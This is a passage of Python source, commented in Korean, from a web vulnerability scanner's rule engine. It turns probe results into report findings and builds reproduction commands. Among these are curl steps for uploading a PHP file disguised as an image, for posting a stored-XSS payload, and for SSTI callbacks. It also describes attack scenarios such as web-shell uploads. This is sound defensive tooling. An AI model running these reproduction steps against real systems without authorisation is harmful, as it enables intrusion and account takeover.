        "attack_scenario": ("1. Upgrade: h2c 요청에 101 응답 확인(업그레이드 수락)\n"
                            "2. 앞단 프록시가 h2c 를 미검사하는지 확인\n"
                            "3. h2c 터널로 프록시 검사를 우회하는 요청 전달(스머글링)"),
        "tools": ["h2csmuggler", "nghttp2", "burpsuite"],
        "cve_references": [],
        "lab_guide": "h2c smuggling — 프록시 우회 검증(h2csmuggler)",
        "recommendation": ("경계(엣지)에서 h2c 업그레이드를 비활성화하거나, 앞단 프록시가 Upgrade/Connection "
                           "헤더를 정규화·검사하도록 구성하세요. 내부 통신만 h2c 를 허용하고 외부 노출을 차단하세요."),
    },
}


def _has_concrete_evidence(probe_key: str, probe_data: dict) -> bool:
    """
    스크린샷 또는 실제 추출 데이터가 있는 경우에만 True를 반환합니다.
    텍스트 패턴 매칭/통계적 추론만으로 탐지된 취약점은 False.
    """
    pd = probe_data

    # XSS: Playwright에서 alert 실제 발생 + 메시지 확인
    if probe_key in ("xss_reflected", "xss_stored", "dom_xss"):
        return bool(pd.get("confirmed") and pd.get("alert_message"))

    # JS-문자열/HTML-속성 컨텍스트 XSS: Playwright alert 확인, 또는 결정적 정적 탈출(static_breakout).
    # 정적 탈출은 구분 따옴표 미인코딩 원문 반사를 확인한 것으로, 브라우저에서 실행이 결정적이다.
    if probe_key in ("xss_js_context", "xss_attr_context"):
        return bool(pd.get("confirmed")
                    and (pd.get("alert_message") or pd.get("verification") == "static_breakout"))

    # SQLi: 에러 메시지 원문 또는 실제 DB 버전 문자열 추출된 경우만
    # boolean/time 기반은 통계적 추론이므로 제외
    if probe_key == "sql_injection":
        sqli_type = pd.get("type", "")
        if sqli_type == "error_based":
            return bool(pd.get("error_snippet"))
        if sqli_type == "union_based":
            return bool(pd.get("extracted_version"))
        # boolean/time: 데이터 추출은 없지만 프로브가 안정성·대조표본 검증으로 confirmed 하면
        # 폐기(맹목적 FN)하지 말고 아래 판정에서 '참고/POSSIBLE(수동검토 권고)'로 표면화한다.
        return bool(pd.get("confirmed"))

    # 블라인드 SQLi: '문자 단위 추출'로 실제 DB 값을 복원한 경우만 확정(오라클 성립만으론 부족).
    if probe_key == "sql_injection_blind":
        return bool(pd.get("confirmed") and (pd.get("extracted_data") or {}).get("db_name"))

    # 브루트포스 방어 부재: 실제 로그인 폼에서 다회 실패에도 임계치가 없음을 확인(attempts>=4)한 경우만.
    if probe_key == "no_bruteforce_protection":
        return bool(pd.get("confirmed") and pd.get("url") and (pd.get("attempts") or 0) >= 4)

    # IDOR: 능동 치환 접근으로 '타 객체 열람 + 무인증 불가'를 실증(confirmed + accessed_value)한 경우만.
    if probe_key == "idor":
        return bool(pd.get("confirmed") and pd.get("accessed_value") and pd.get("url"))

    # LFI: 실제 파일 내용이 응답에 노출된 경우만
    if probe_key == "lfi":
        return bool(pd.get("file_content_preview"))

    # CMDI: echo 토큰이 응답에 실제로 나타난 경우만 (시간 지연 방식 제외)
    if probe_key == "cmd_injection":
        return pd.get("type") == "output_based"

    # SSTI: 수식 평가 결과가 응답에 실제로 출력된 경우
    if probe_key == "ssti":
        return bool(pd.get("expected_result") and pd.get("confirmed"))

    # JNDI/Log4Shell: OOB raw-TCP 콜백(oob_hit) 확증만 인정 — 콜백 없으면 미보고(오탐 0)
    if probe_key == "jndi":
        return bool(pd.get("confirmed") and pd.get("oob_hit"))

    # XXE: 파일 내용이 실제로 노출된 경우
    if probe_key == "xxe":
        return bool(pd.get("confirmed"))

    # CORS: wildcard는 POSSIBLE(INFO), 반사+credentials는 CONFIRMED
    if probe_key == "cors":
        cors_type = pd.get("type", "")
        if cors_type == "wildcard":
            return False  # INFO — 공개 API 의도적 설정 가능
        return bool(pd.get("confirmed") and pd.get("allow_origin"))

    # CRLF: 주입한 헤더가 실제로 응답에 나타난 경우
    if probe_key == "crlf":
        return bool(pd.get("confirmed") and pd.get("injected_header"))

    # Open Redirect: Location 헤더에 외부 URL이 실제로 반환된 경우
    if probe_key == "open_redirect":
        return bool(pd.get("confirmed") and pd.get("redirect_to"))

    # SSRF: OOB 콜백 실증만 인정(oob_hit). 본문 텍스트 매칭은 오탐률이 높아 배제 —
    # 예전에 SSRF 가 통째로 비활성됐던 이유. 콜백 히트가 있어야만 취약으로 판정.
    if probe_key == "ssrf":
        return bool(pd.get("confirmed") and pd.get("oob_hit"))

    # 파일 업로드: 실제 실행까지 확인된 경우만 (업로드 성공 응답만으로는 불충분)
    if probe_key == "file_upload":
        # 업로드된 파일이 '실제 실행'까지 확인(차등 실증, code_execution)된 경우만 확정.
        # (업로드 성공/조회 가능만으로는 CONFIRMED 로 오판하지 않는다 — 무제한 업로드 폼은 참고로만)
        return bool(pd.get("uploaded_url") and pd.get("code_execution"))

    # SQL 인젝션 인증 우회: 302 리다이렉트 또는 성공 키워드로 실증
    if probe_key == "sqli_auth_bypass":
        return bool(pd.get("confirmed") and (pd.get("redirect_to") or pd.get("response_status") == 200))

    # Vim 스왑 파일: 실제 URL 접근으로 파일 발견
    if probe_key == "vim_swp":
        return bool(pd.get("confirmed") and pd.get("url"))

    # 이메일 헤더 인젝션: 실제 헤더 삽입 확인
    if probe_key == "email_header_injection":
        return bool(pd.get("confirmed"))

    # 에러페이지 정보노출: DB/서버 오류 메시지 원문(error_snippet)이 실제 확보된 경우만
    if probe_key == "error_info_disclosure":
        return bool(pd.get("confirmed") and pd.get("error_snippet"))

    # CSRF: '실제 수행'을 실증(csrf_executed)한 경우만 취약점으로 확정한다.
    # 안티-CSRF 토큰 '부재'라는 구조적 사실만으로는 "어떤 행위가 실제 가능한지" 실증되지 않아
    # 보고서 독자가 왜 취약한지 이해하기 어렵다(사용자 지침). 위조 상태변경 요청을 서버가 실제
    # 수락함을 확인(값 불변·비파괴)한 경우에만 finding 으로 올린다.
    if probe_key == "csrf_form":
        return bool(pd.get("confirmed") and pd.get("csrf_executed"))

    # Phase 2 신규
    # Clickjacking: Playwright iframe 실제 로드 + 스크린샷
    if probe_key == "clickjacking":
        return bool(pd.get("confirmed") and pd.get("evidence_screenshots"))

    # CSP 우회: <base> 하이재킹된 스크립트가 브라우저에서 실제 실행됨을 실증한 경우만 CONFIRMED
    if probe_key == "csp_bypass":
        return bool(pd.get("confirmed") and pd.get("hijack_executed"))

    # Swagger/OpenAPI: HTTP 200 + swagger 콘텐츠 확인
    if probe_key == "swagger_openapi":
        return bool(pd.get("confirmed") and pd.get("url"))

    # GraphQL Introspection: __schema 응답 확인
    if probe_key == "graphql_introspection":
        return bool(pd.get("confirmed") and pd.get("url"))

    # Spring Actuator: 민감정보 키워드 포함 시 CONFIRMED, 단순 접근 가능은 POSSIBLE
    if probe_key == "spring_actuator":
        return bool(pd.get("confirmed") and pd.get("accessible_paths"))

    # Source Map: sources 키 포함 .map 파일 확인
    if probe_key == "source_map":
        return bool(pd.get("confirmed") and pd.get("url"))

    # Backup File: 민감 콘텐츠 포함 백업 파일 확인
    if probe_key == "backup_file":
        return bool(pd.get("confirmed") and pd.get("url"))

    # JS Secrets: 실제 패턴 매칭된 시크릿
    if probe_key == "js_secrets":
        findings = pd.get("findings", [])
        return any(f.get("confirmed") for f in findings)

    # Phase 6 신규
    # 관리자 페이지: HTTP 200/302/401에서 로그인 폼 또는 관리자 키워드 확인
    if probe_key == "admin_panel":
        return bool(pd.get("confirmed") and pd.get("found_pages"))

    # 관리자 API: HTTP 200 + JSON + 민감 키워드 — URL이 실증 증거
    if probe_key == "admin_api":
        return bool(pd.get("confirmed") and pd.get("found_endpoints"))

    # 프레임워크 정보: 상태 노출(__NEXT_DATA__ 등)이 있으면 CONFIRMED, 단순 탐지는 POSSIBLE
    if probe_key == "framework_info":
        return bool(pd.get("detected_frameworks"))  # POSSIBLE 허용

    # User Enumeration: 응답 차이가 확인된 경우만 CONFIRMED
    if probe_key == "user_enumeration":
        return bool(pd.get("confirmed") and pd.get("difference"))

    # 접근제어/로직 후보: 수집된 후보가 있으면 '참고/수동검토'로 보고(취약 확정 아님)
    if probe_key in ("idor_candidate", "csrf_candidate",
                     "business_logic_candidate", "file_upload_candidate"):
        return bool(pd.get("candidates") or pd.get("weak_samesite_cookies"))

    # NoSQL 연산자 주입: 프로브가 $ne(참)/$eq(거짓) 불린 차등 또는 Mongo 오류 시그니처로 '연산자
    # 실제 해석'을 확증한 경우에만 결과를 emit 한다(미확증은 프로브가 폐기). 따라서 결과가 있으면
    # 실증 확정(CONFIRMED/취약) — 더 이상 참고/수동검토로 남기지 않는다.
    if probe_key == "nosql_injection":
        return bool(pd.get("nosql_confirmed"))

    # 안전하지 않은 역직렬화: 직렬화 객체 서명이 감지된(노출) 경우 '참고/수동검토'로 표면 보고
    if probe_key == "deserialization":
        return bool(pd.get("locations"))

    # API 인지형 점검: 과다노출/Mass Assignment/BOLA 후보 중 하나라도 있으면 '참고/수동검토'
    if probe_key == "api_audit":
        return bool(pd.get("excessive_data_exposure") or pd.get("business_logic_candidates")
                    or pd.get("mass_assignment_candidates") or pd.get("bola_candidates"))

    # jwt/auth_bypass 는 '능동 확증'이 있을 때만 취약으로 인정한다:
    #   jwt         — 토큰 페이로드에서 비밀/민감정보 노출, 또는 alg 조작 수락
    #   auth_bypass — IP 제한 우회(401/403 → X-Forwarded-For 로 200) 등 상태 차등 실증
    # (이전엔 무조건 return False 로 '실제 확증된' 결과까지 폐기 → 블라인드SQLi 폐기와 동일 계열의
    #  누락 버그였다.)
    if probe_key in ("jwt", "auth_bypass"):
        return bool(pd.get("confirmed") and (
            pd.get("evidence") or pd.get("evidence_detail") or pd.get("url")
            or pd.get("affected_endpoints") or pd.get("payload")))
    # csrf 는 능동 실증(스푸핑 Origin 수락)과 텍스트기반 탐지의 구분이 애매해 오탐 위험이 커
    # 여기서는 취약 확정하지 않는다 — csrf_candidate(참고/수동검토)로 별도 처리됨.
    if probe_key == "csrf":
        return False

    # 기본(명시 분기 없는 신규 키): confirmed=True 만으로는 부족 — 최소한 하나의 '구체 증거 신호'를
    # 동반해야 확정으로 인정한다(bare {"confirmed": True} 오탐 방지). 실 프로브는 evidence/url/payload
    # /oob_hit 중 하나 이상을 항상 싣는다. (신규 프로브 추가 시 가급적 키별 명시 분기를 권장)
    return bool(pd.get("confirmed") and (
        pd.get("evidence") or pd.get("evidence_detail") or pd.get("oob_hit")
        or pd.get("url") or pd.get("payload") or pd.get("param")
        or pd.get("affected_endpoints") or pd.get("evidence_screenshots")))


def _build_active_probe_findings(
    host: str,
    port: int,
    service_name: str,
    active_probes: dict,
    prev_titles: set,
) -> list[dict]:
    """active_probes 딕셔너리를 KISA finding 형식으로 변환합니다."""
    results = []
    http_url = f"http{'s' if port in (443, 8443) else ''}://{host}:{port}"

    for probe_key, probe_data in active_probes.items():
        template = _ACTIVE_PROBE_TEMPLATES.get(probe_key)
        if not template:
            # 계약 정리: template 없는 키는 (a)main.py 에서 별도 집계되거나(login_sqli/csrf_dynamic)
            # (b)'_' 접두 메타키(_sqli_candidates 등)면 정상 스킵. 그 외 미지의 키는 orphan 위험이므로
            # 경고 로그로 표면화(조용한 유실 방지 — 신규 프로브 추가 시 template 누락을 즉시 인지).
            if probe_key not in _PROBE_KEYS_HANDLED_ELSEWHERE and not str(probe_key).startswith("_"):
                _LOG.warning("[rule_engine] active_probe 키 '%s' 에 대응 template/handler 없음 — "
                             "결과가 판정에 반영되지 않음(orphan). _ACTIVE_PROBE_TEMPLATES 확인 필요.",
                             probe_key)
            continue
        if not isinstance(probe_data, dict):
            continue

        # 스크린샷 또는 실제 데이터로 증명 불가능한 결과는 제외
        if not _has_concrete_evidence(probe_key, probe_data):
            continue

        title = template["title"]
        is_persistent = stable_title(title) in prev_titles
        probe_evidence = probe_data.get("evidence", "")
        confirmed = probe_data.get("confirmed", False)
        effective_severity = template["severity"]
        # 동적 승격을 위해 오버라이드 가능한 로컬(기본=템플릿 값)
        eff_description = template["description"]
        eff_scenario = template["attack_scenario"]
        eff_cvss = template["cvss_estimate"]
        eff_cwe = template.get("cwe", "")

        # CSRF 후보: 후보별 위험도(LOW/MEDIUM/HIGH) 평가 → severity 추천(자동 확정 아님)
        _csrf_risk = None
        if probe_key == "csrf_candidate":
            try:
                import candidate_verification as _cv
                _ss = (probe_data.get("weak_samesite_cookies") or [])
                _ss_weak = bool(_ss)  # 미흡 쿠키가 수집됐으면 weak 로 간주
                _risks = []
                for _c in (probe_data.get("candidates") or []):
                    _r = _cv.score_csrf_risk({
                        "url": _c.get("url", ""), "method": _c.get("method", "POST"),
                        "params": _c.get("params", []), "token_present": False,
                        "samesite": "none" if _ss_weak else "lax", "authenticated": True,
                    })
                    _c["risk"] = _r["risk"]
                    _risks.append(_r["risk"])
                _order = {"LOW": 1, "MEDIUM": 2, "HIGH": 3}
                _max = max(_risks, key=lambda x: _order.get(x, 0)) if _risks else "MEDIUM"
                effective_severity = _max
                _csrf_risk = _max
                title = f"{template['title']} — 추천 위험도 {_max}"
            except Exception:
                pass

        # CORS: cors_level에 따라 severity/title 동적 결정
        if probe_key == "cors":
            cors_level = probe_data.get("cors_level", "")
            cors_type = probe_data.get("type", "")
            _cors_severity_map = {"INFO": "LOW", "LOW": "LOW", "MEDIUM": "MEDIUM", "HIGH": "HIGH"}
            effective_severity = _cors_severity_map.get(cors_level, "MEDIUM")
            if cors_type == "wildcard":
                title = "CORS 와일드카드 설정 — 공개 리소스 모든 오리진 허용"
            elif cors_level == "LOW":
                title = "CORS Origin 반사 — 임의 도메인 크로스도메인 요청 허용"
            elif cors_level == "MEDIUM":
                title = "CORS 설정 미흡 — Origin 반사 + 자격증명 허용 (세션 탈취 가능)"
            elif cors_level == "HIGH":
                title = "CORS 취약점 — 인증 API에서 임의 Origin 반사 + 자격증명 허용"

        # SSTI → RCE 실증(P5, PROOF): OOB 콜백으로 코드 실행 도달성이 확증되면 CRITICAL 로 승격
        if probe_key == "ssti" and probe_data.get("rce_confirmed"):
            effective_severity = "CRITICAL"
            eff_cvss = "9.9"
            eff_cwe = "CWE-94"
            _eng = probe_data.get("engine", "")
            title = f"SSTI → 원격 코드 실행(RCE) 실증 확인 ({_eng})"
            eff_description = (
                "템플릿 인젝션이 단순 수식 평가를 넘어 '서버측 코드 실행'으로 확증되었습니다. "
                "주입한 템플릿 페이로드가 엔진 네이티브 네트워크 프리미티브를 실행해 스캐너 OOB "
                "리스너로 아웃바운드 요청을 발생시켰습니다(셸/데이터 추출 없이 도달성만 실증). "
                "공격자는 동일 실행 경로로 임의 코드를 실행해 서버를 완전히 장악할 수 있습니다."
            )
            eff_scenario = (
                "1. {{7*7}} → '49' 평가로 SSTI 1차 확인\n"
                "2. PROOF 모드에서 엔진 네이티브 HTTP 프리미티브(urllib/Net::HTTP/"
                "file_get_contents/java.net.URL)로 OOB 콜백 페이로드 구성\n"
                "3. 서버가 콜백 토큰으로 스캐너 OOB 리스너에 접속 → 코드 실행 도달성 확증\n"
                "4. 동일 경로로 임의 코드 실행 가능 → 서버 완전 장악(실증은 무해 콜백까지만)"
            )

        # 반사형 XSS 프로브가 'DOM 기반 싱크'로 확증한 경우(type=dom): 서버 응답에 반사되지 않고
        # 클라이언트 JS 가 URL 을 위험 싱크에 반영해 실행되므로 '반사형'이 아니라 'DOM 기반'으로 표기(오라벨 교정).
        if probe_key == "xss_reflected" and probe_data.get("type") == "dom":
            title = "DOM 기반 XSS (DOM-based XSS) 실증 확인"
            eff_description = (
                "이 XSS 는 '반사형·저장형'과 다릅니다: 주입한 스크립트가 (1) 서버 응답 본문에 반사되지도 "
                "않고 (2) 서버(DB)에 저장되지도 않습니다. 대신 페이지의 클라이언트측 JavaScript 가 "
                "주소창 값(document.location/URL·search·hash)을 읽어 document.write·innerHTML 같은 위험한 "
                "DOM(Document Object Model) 싱크에 그대로 삽입하기 때문에, 서버를 거치지 않고 피해자 "
                "브라우저 내부에서 스크립트가 실행됩니다(DOM 기반 XSS). "
                "여기서 'DOM' 은 '객체모델 실행'이 아니라 브라우저가 문서를 표현하는 문서 객체 모델을 뜻하며, "
                "취약점의 위치가 서버가 아니라 클라이언트 JavaScript 라는 의미입니다. "
                "Playwright 브라우저에서 alert() 실제 발생으로 확증했습니다."
            )
            eff_cwe = "CWE-79"

        # CSRF: 위조 요청을 서버가 실제 수락함을 확인(csrf_executed)하면 '구조 확증'을 넘어 '실제 수행 확증'.
        if probe_key == "csrf_form" and probe_data.get("csrf_executed"):
            _cu = probe_data.get("url", "")
            _cm = str(probe_data.get("method", "GET")).upper()
            title = "CSRF 취약점 — 위조 요청 '실제 수행' 확증"
            eff_description = (
                "【실증된 행위】 anti-CSRF 토큰을 뺀 채, 외부 사이트(evil.attacker.example)를 Origin/Referer 로 "
                f"위장한 '{_cm}' 방식 상태변경 요청(비밀번호 변경)을 대상 서버가 '실제로 수락'했습니다"
                "(응답에 변경 성공 표시 확인). 즉 단순 설정 미흡이 아니라, 공격자가 만든 페이지를 로그인된 "
                "피해자가 '열기만 해도' 피해자의 비밀번호가 공격자가 정한 값으로 바뀌어 계정이 탈취될 수 있음이 "
                "실제 요청으로 확인됐습니다. "
                "※ 비파괴 검증: 비밀번호를 현재와 '동일한 값'으로 설정해 실제 값 변경·계정 영향은 없습니다. "
                f"(대상 폼: {_cu})"
            )
            eff_scenario = (
                "1. 공격자가 대상의 비밀번호 변경 요청을 그대로 담은 HTML(PoC)을 웹에 배치\n"
                "2. 로그인 상태의 피해자가 그 페이지를 방문(링크 클릭·이미지 로드·자동제출 폼)\n"
                f"3. 브라우저가 피해자 세션 쿠키를 실어 대상에 {_cm} 요청 전송 — 토큰 검증이 없어 서버가 수락\n"
                "4. 피해자 비밀번호가 공격자 값으로 변경 → 계정 탈취 (본 점검은 동일 값으로 무해하게 실증)"
            )
            eff_cvss = "8.0"

        # 파일 업로드 → RCE 실증(P6): 업로드 스크립트가 서버측에서 실제 실행되면 CRITICAL 로 승격
        if probe_key == "file_upload" and probe_data.get("code_execution"):
            effective_severity = "CRITICAL"
            eff_cvss = "9.8"
            _eng = probe_data.get("engine", "")
            title = f"파일 업로드 → 원격 코드 실행(RCE) 실증 확인 ({_eng})"
            eff_description = (
                "위험 확장자 파일 업로드가 서버측 '코드 실행'으로 확증되었습니다. 업로드한 스크립트를 "
                "되받아 실행 결과가 반환되고 원문 소스는 노출되지 않았습니다(정적 서빙 아님). "
                "공격자는 웹쉘을 업로드해 임의 명령을 실행하고 서버를 완전히 장악할 수 있습니다."
            )
            eff_scenario = (
                "1. 위험 확장자 스크립트를 Content-Type 위조로 업로드\n"
                "2. 업로드된 파일 URL 확보 후 접근\n"
                "3. 서버가 소스를 '실행'해 계산 결과(6*7=42) 반환 — 정적 서빙과 차등 확인\n"
                "4. 동일 경로로 웹쉘 업로드 → 임의 명령 실행 → 서버 완전 장악"
            )

        # 브루트포스: '실제 대입으로 자격증명을 알아내 로그인 성공'까지 실증하면 HIGH 로 승격.
        if probe_key == "no_bruteforce_protection" and probe_data.get("cracked"):
            effective_severity = "HIGH"
            eff_cvss = "8.1"
            title = "무차별 대입으로 계정 탈취 실증 — 시도 횟수 임계치 없음"
            _ca = probe_data.get("crack_position") or probe_data.get("crack_attempts")
            _tot = probe_data.get("attempts") or _ca
            eff_description = (
                f"로그인에 시도 횟수 임계치(계정 잠금·rate limit·CAPTCHA)가 없어, 총 {_tot}회 시도 내내 "
                "차단이 전혀 없었고(비밀번호 강도와 무관하게 방어 부재), 흔한 비밀번호 사전으로 자동 대입한 "
                f"결과 {_ca}번째 시도에 실제 자격증명을 알아내 '로그인에 성공'했습니다. 단순 설정 미흡이 "
                "아니라 무차별 대입으로 계정을 실제 탈취할 수 있음이 확증된 것으로, 공격자는 동일 방식으로 "
                "관리자·사용자 계정을 장악할 수 있습니다(비파괴: 상태 변경 없이 인증 성공 여부만 확인)."
            )
            eff_scenario = (
                "1. 로그인 폼에 계정 잠금·CAPTCHA·rate limit 부재 확인\n"
                "2. 흔한 비밀번호 사전으로 자동 대입(도구: hydra/Burp Intruder 등)\n"
                f"3. {_ca}번째 시도에 자격증명 적중 → 로그인 성공(응답이 실패와 뚜렷이 달라짐)\n"
                "4. 획득 계정으로 권한 내 기능 접근·추가 공격 발판 확보"
            )

        # 탐지 단계 구성
        steps = _build_probe_detection_steps(probe_key, probe_data, http_url)

        # 발견 위치 URL: 프로브가 'url' 을 안 주는 유형(저장형 XSS 등)은 verify/submit URL 로 보정
        # (과거엔 base(루트)로 폴백돼 스크린샷·발견URL 이 'DVWA 홈'으로 잘못 표기됐음).
        evidence_url = (probe_data.get("url") or probe_data.get("verify_url")
                        or probe_data.get("submit_url") or http_url)
        _rc_method = (probe_data.get("method") or "GET").upper()
        # 정확 재현: 프로브가 실제 확증에 사용한 주입 URL/body(repro_url/repro_body)를 우선 사용한다.
        # (기존엔 GET 주입인데도 base URL 만 curl 로 찍혀 '페이로드 없는 재현'이 되어 검증 불가였음 —
        #  예: SQLi error_based 가 curl "…/brute/" 로만 표기돼 실제 주입이 안 보였음.)
        _rc_repro_url = probe_data.get("repro_url")
        _rc_body = probe_data.get("repro_body") or probe_data.get("body", "")
        # POST 주입인데 body 가 없으면 주입 파라미터=페이로드로 최소 재현 body 를 구성한다.
        if (_rc_method == "POST" and not _rc_body
                and probe_data.get("param") and probe_data.get("payload") is not None):
            _rc_body = (f"{probe_data['param']}="
                        f"{urllib.parse.quote(str(probe_data['payload']), safe='')}")
        reproduction_cmd = _make_reproduction_cmd(
            _rc_repro_url or evidence_url, method=_rc_method, body=_rc_body,
        )
        # 파일 업로드/저장형 XSS 는 일반 curl 한 줄로는 '무엇을 업로드/저장해 무엇이 실행됐는지'가
        # 안 보인다 → probe_detail 의 실제 값으로 정확한 다단계 재현을 구성(사용자 확인 가능하도록).
        if probe_key == "file_upload" and probe_data.get("uploaded_url"):
            _up = probe_data.get("uploaded_url")
            _form = probe_data.get("url") or evidence_url
            reproduction_cmd = (
                '# proof.php 내용: <?php echo "It_Was_Executed_By_Eoseureum=".(6*7); ?>\n'
                "# 1) 무해 PHP(문구+산술 출력)를 이미지로 위장해 업로드 (인증 세션 필요)\n"
                f'curl -s -b "<로그인 세션 쿠키>" '
                f'-F "uploaded=@proof.php;type=image/jpeg" -F "Upload=Upload" "{_form}"\n'
                "# 2) 업로드된 파일 접근 → 서버가 코드를 '실행'해 문구 출력(=코드 실행 확증)\n"
                f'curl -s "{_up}"\n'
                '# 기대 출력: It_Was_Executed_By_Eoseureum=42   (=42 는 6×7 서버 계산값. 원문 "(6*7)" 보이면 정적 서빙)'
            )
        elif probe_key == "xss_stored":
            _sub = probe_data.get("submit_url") or evidence_url
            _ver = probe_data.get("verify_url") or _sub
            _pparam = probe_data.get("param") or "입력값"
            _ppl = probe_data.get("payload") or ""
            reproduction_cmd = (
                "# 1) 저장형 XSS 페이로드를 폼에 저장 (인증 세션 필요)\n"
                f'#    제출 URL: {_sub}  ·  파라미터: {_pparam}\n'
                f'#    페이로드: {_ppl}\n'
                f'curl -s -b "<로그인 세션 쿠키>" -X POST "{_sub}" '
                f'--data-urlencode "{_pparam}={_ppl}"\n'
                "#    (그 외 폼의 필수 필드·제출 버튼 값도 함께 전송해야 저장됩니다)\n"
                "# 2) 저장 페이지 재방문 → 페이로드가 그대로 반영되면 방문자 브라우저에서 실행됨\n"
                f'curl -s -b "<로그인 세션 쿠키>" "{_ver}" | grep -F "{str(_ppl)[:40]}"'
            )
        # needs_cleanup: Stored XSS와 같이 테스트 데이터가 서버에 저장된 경우
        needs_cleanup = probe_key in ("xss_stored", "file_upload")
        cleanup_marker = probe_data.get("cleanup_marker")
        cleanup_status = None
        if needs_cleanup:
            cleanup_status = {
                "required": True,
                "marker": cleanup_marker,
                "cleanup_attempted": probe_data.get("cleanup_attempted", False),
                "cleanup_success": probe_data.get("cleanup_success", False),
                "cleanup_detail": probe_data.get("cleanup_detail", ""),
                "unreverted_files": probe_data.get("unreverted_files", []),
            }

        # 후보(candidate) 템플릿: 취약 확정이 아니라 '참고/수동검토'로 분류한다.
        # 단순 탐지(기술 지문 등)는 실증이 아니므로 POSSIBLE/참고로 강등(예: framework_info).
        is_candidate = bool(template.get("candidate"))
        _detection_only = probe_key in ("framework_info",) or bool(template.get("detection_only"))
        # api_audit: 응답에 민감필드가 '실제 노출'(관측)됐으면 과다정보노출=실증(취약). 스펙 구조상
        # 후보(Mass Assignment/BOLA)만이면 폐기·수동검토가 아니라 '공격 표면'으로 분류(테스트 대상).
        _api_surface_only = (probe_key == "api_audit"
                             and not probe_data.get("excessive_data_exposure")
                             and (probe_data.get("mass_assignment_candidates")
                                  or probe_data.get("bola_candidates")
                                  or probe_data.get("business_logic_candidates")))
        # 블라인드 SQLi(boolean/time): 데이터 추출은 없으나 통계적으로 확증 → 폐기도 취약확정도 아닌
        # '참고/POSSIBLE(수동검토 권고)' 중간 등급으로 표면화(에러/유니온 기반은 아래에서 취약 확정).
        # 단, PROOF 에서 '블라인드 문자추출'로 실제 데이터를 읽어냈으면(blind_confirmed) 취약 확정으로 승격.
        _blind_extracted = bool(probe_data.get("blind_confirmed")
                                or (isinstance(probe_data.get("extracted_data"), dict)
                                    and probe_data["extracted_data"].get("technique") == "boolean_blind"))
        _blind_sqli = (probe_key == "sql_injection"
                       and probe_data.get("type", "") in ("boolean_based", "time_based")
                       and not _blind_extracted)
        if is_candidate:
            _judgment, _confidence = "참고", "MANUAL_REVIEW"
        elif _api_surface_only:
            _judgment, _confidence = "표면", "POSSIBLE"   # 공격 표면(아래 force_finding_type=attack_surface)
        elif _detection_only or _blind_sqli:
            _judgment, _confidence = "참고", "POSSIBLE"
        else:
            _judgment, _confidence = "취약", "CONFIRMED"

        finding = {
            "host": host,
            "port": port,
            "service": service_name,
            "judgment": _judgment,
            "severity": effective_severity,
            "confidence": _confidence,
            "cvss_estimate": eff_cvss,
            "exploitation_difficulty": template["exploitation_difficulty"],
            "owasp": _OWASP_MAPPING.get(probe_key, ""),
            "cwe": eff_cwe,
            "is_new": not is_persistent,
            "is_persistent": is_persistent,
            "is_resolved": False,
            "title": title,
            "description": eff_description,
            "attack_vector": template["attack_vector"],
            "attack_scenario": eff_scenario,
            "tools": template["tools"],
            "cve_references": template["cve_references"],
            "lab_guide": template["lab_guide"],
            "recommendation": template["recommendation"],
            "evidence_url": evidence_url,
            "detection_steps": steps,
            "evidence_detail": probe_evidence,
            # 프로브가 실증 순간을 직접 촬영한 스크린샷을 finding 최상위로 전파한다(과거엔 probe_detail
            # 에만 있어 보고서가 못 읽고, 범용 캡처가 대신 루트 화면만 찍히던 문제). 없으면 빈 리스트 →
            # 이후 capture_evidence_screenshots(범용)가 대체 촬영.
            "evidence_screenshots": list(probe_data.get("evidence_screenshots") or []),
            "evidence_screenshot": (probe_data.get("evidence_screenshots") or [""])[0],
            "reproduction_cmd": reproduction_cmd,
            "affected_endpoints": probe_data.get("affected_endpoints", [evidence_url]),
            "cleanup_status": cleanup_status,
            "probe_confirmed": confirmed,
            "probe_detail": {k: v for k, v in probe_data.items()
                             if k not in ("evidence",) and not isinstance(v, bytes)},
        }
        if is_candidate:
            # 후보는 참고(discovery) 버킷으로 고정 — 취약점 카운트에 포함시키지 않는다.
            finding["force_finding_type"] = "discovery"
            finding["is_candidate"] = True
        elif _api_surface_only:
            # 구조적 API 후보(Mass Assignment/BOLA)는 '공격 표면' 버킷 — 취약 카운트 미포함,
            # 수동검토(참고)로 미루지 않고 테스트 대상 노출 지점으로 표기(A/B 검증 시 취약 승격).
            finding["force_finding_type"] = "attack_surface"
        results.append(finding)

    return results


def _build_probe_detection_steps(probe_key: str, data: dict, base_url: str) -> list[str]:
    """probe 키에 따라 구체적인 탐지 단계를 생성합니다."""
    param = data.get("param", "파라미터")
    url = data.get("url", base_url)
    payload = data.get("payload", "")

    if probe_key == "xss_reflected":
        alert_msg = data.get("alert_message", "")
        _method = (data.get("method") or "GET").upper()
        _sep = "&" if "?" in url else "?"
        _get_url = f"{url}{_sep}{param}={urllib.parse.quote(payload, safe='')}"
        if _method == "POST":
            _repro_line = (f"        브라우저로 재현: 개발자도구 콘솔 또는 HTML 폼으로 아래 값을 "
                           f"'{param}'에 넣어 POST 제출 → alert 발생")
            _access = "[3단계] 제출 후 서버 응답을 브라우저(또는 Playwright)로 렌더링"
        else:
            _repro_line = (f"        브라우저로 재현: 아래 URL 을 '웹브라우저 주소창'에 열면 alert 발생 "
                           f"(curl 은 스크립트를 실행하지 않으므로 alert 확인 불가):\n"
                           f"        {_get_url}")
            _access = "[3단계] 위 URL 을 브라우저(또는 Playwright)로 접근"
        return [
            f"[개요] 파라미터 '{param}'의 입력값이 HTML 인코딩 없이 응답에 그대로 반사되어 "
            f"브라우저에서 JavaScript 로 실행됩니다({_method}).",
            f"[1단계] 대상: {url}",
            f"[2단계] '{param}' 에 아래 XSS 페이로드 삽입(원문 그대로, 인코딩 없이):",
            f"        페이로드(원문) ▶ {payload}",
            _repro_line,
            _access,
            f"[4단계] alert() 대화상자 실제 발생 확인 — 발생 메시지: \"{alert_msg}\"",
            f"[해석] 위 alert 는 삽입한 스크립트가 '피해자 브라우저에서 실제로 실행'됨을 의미합니다.",
            f"[결론] JavaScript 브라우저 실행 확인 → 반사형 XSS 실증 완료({_method}). "
            f"※ URL 은 전송을 위해 퍼센트 인코딩되어 있으며, 위 '원문 페이로드'가 실제 삽입값입니다.",
        ]

    if probe_key == "api_audit":
        _steps = [f"[1단계] OpenAPI 스펙 파싱 — 오퍼레이션 {data.get('operations_parsed', 0)}개 분석"]
        _exp = data.get("excessive_data_exposure") or []
        if _exp:
            _steps.append(f"[과다노출] 민감 필드 응답 노출 {len(_exp)}건(읽기 확인)")
            for _e in _exp[:5]:
